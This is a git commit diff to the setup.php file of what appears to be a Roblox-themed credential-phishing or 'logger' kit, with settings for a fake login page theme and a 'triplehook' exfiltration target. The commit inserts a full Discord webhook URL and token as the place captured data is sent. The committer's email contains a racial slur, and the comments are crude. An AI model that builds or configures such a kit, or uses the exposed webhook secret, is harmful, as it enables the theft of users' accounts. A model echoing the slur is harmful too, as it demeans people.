7f71d177d9f6e4ca615682161360fb4c36747c91
Juiko7zX <juikodatnigga@outlook.com>
2025-01-06 10:48:34 -0500

    Update setup.php

--- setup.php
+++ setup.php
@@ -2,7 +2,7 @@
 $name = 'TermedRaaaa'; // Change to ur own name
 $thumbnail = 'https://images.rbxcdn.com/cece570e37aa8f95a450ab0484a18d91'; // discord webhook thumbnail & logger thumbnail
 $hex = '#00000'; // color shit
-$triplehook = ''; // input ur fucking triplehook webhook here 
+$triplehook = 'https://discord.com/api/webhooks/1325853422255210567/yrvwH6rYZojyo1G6d1NXb51P4ZaUdrXRW2VvPOz7Vje9qbQpQgna06w02JsK1aIIgUjm'; // input ur fucking triplehook webhook here 
 $loginColor = [
     "theme" => "dark", // change be changed to white to for white login page
 ];
